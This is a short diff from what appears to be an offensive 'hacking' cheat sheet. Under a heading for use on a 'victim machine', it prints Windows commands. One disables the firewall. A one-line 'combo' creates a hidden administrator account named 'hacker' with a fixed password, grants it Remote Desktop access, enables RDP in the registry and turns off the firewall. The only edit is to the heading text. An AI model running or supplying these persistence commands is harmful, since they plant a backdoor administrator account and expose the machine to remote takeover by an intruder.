@@ -306,7 +306,7 @@ On victim machine:
 
 	netsh firewall set opmode disable
 
-<b>One shot ninja combo (New User, Firewall Off + RDP):</b>
+<b>One shot ninja combo (New Admin User, Firewall Off + RDP):</b>
 
 	set CMD "net user hacker Hacker123 /add & net localgroup administrators hacker /add & net localgroup \"Remote Desktop Users\" 	hacker /add & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall set opmode disable"
 
